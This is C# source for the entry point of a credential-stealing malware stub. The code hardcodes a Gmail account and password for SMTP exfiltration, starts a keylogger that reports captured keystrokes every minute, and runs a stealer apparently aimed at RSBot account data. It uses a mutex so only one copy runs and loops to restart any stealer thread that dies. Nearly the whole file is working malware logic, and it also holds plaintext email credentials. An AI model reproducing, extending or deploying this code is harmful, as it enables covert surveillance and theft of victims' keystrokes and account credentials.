using System.Threading;
using sub.Stealers;
using sub.Util.Threading;

namespace sub
{
    internal class Program
    {
        private static void Main()
        {
            /*
                SettingsParser parser = new SettingsParser(Application.ExecutablePath);
                string[] decryptedSettings = parser.GetSettings();
                Settings.EmailAddress = decryptedSettings[0];
                Settings.EmailPassword = "decryptedSettings[1];
                Settings.SmtpAddress = decryptedSettings[2];
                Settings.SmtpPort = decryptedSettings[3];
             */
            Settings.EmailAddress = "sexmongrel69@gmail.com";
            Settings.EmailPassword = "omglawls";
            Settings.SmtpAddress = "smtp.gmail.com";
            Settings.SmtpPort = 587;

            Variables.Mutex = new Mutex(false, Variables.MutexID, out Variables.CreatedMutex);
            
            StealerThread logger = new StealerThread(new Keylogger(), 1);    
            logger.Start(); //Starts a Keylogger that reports every 1 minute
            

            StealerThread rsbot = new StealerThread(new RSBotStealer(), -1);
            rsbot.Start();

            while (true)
            {
                //Implement some kind of checking to make sure none of the threads crashed
                //Restart them if they did (unless they are meant to run once)
                foreach(StealerThread st in Variables.stealerPool)
                {
                    if (st.GetDelay() < 1) continue; //If it is meant to run once, don't revive
                    if(st.GetStealerThread().ThreadState != ThreadState.Running
                        && st.GetStealerThread().ThreadState != ThreadState.WaitSleepJoin)
                    {
                        st.Start();
                    }
                    if(st.GetReporterThread().ThreadState != ThreadState.Running
                        && st.GetReporterThread().ThreadState != ThreadState.WaitSleepJoin)
                    {
                        st.Start();
                    }
                }
                Thread.Sleep(1000); //Sleep the main thread so the stub doesn't close
            }
        }
    }
}